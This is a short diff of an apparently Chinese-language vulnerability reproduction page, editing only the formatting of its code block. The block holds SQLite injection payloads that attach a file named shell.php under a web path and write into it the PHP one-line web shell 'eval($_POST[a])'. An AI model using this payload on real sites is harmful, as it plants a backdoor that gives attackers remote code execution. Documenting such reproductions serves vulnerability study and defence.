@@ -5,5 +5,4 @@
 <h2>三、复现过程</h2>
 <pre><code>ATTACH DATABASE 'z.php' AS t;create TABLE t.e (d text);/*
 
-ATTACH DATABASE '/网站/路径/shell.php' AS t;insert INTO t.e (d) VALUES ('&lt;?php eval($_POST[a])?&gt;');/*
-</code></pre>
+ATTACH DATABASE '/网站/路径/shell.php' AS t;insert INTO t.e (d) VALUES ('&lt;?php eval($_POST[a])?&gt;');/*</code></pre>
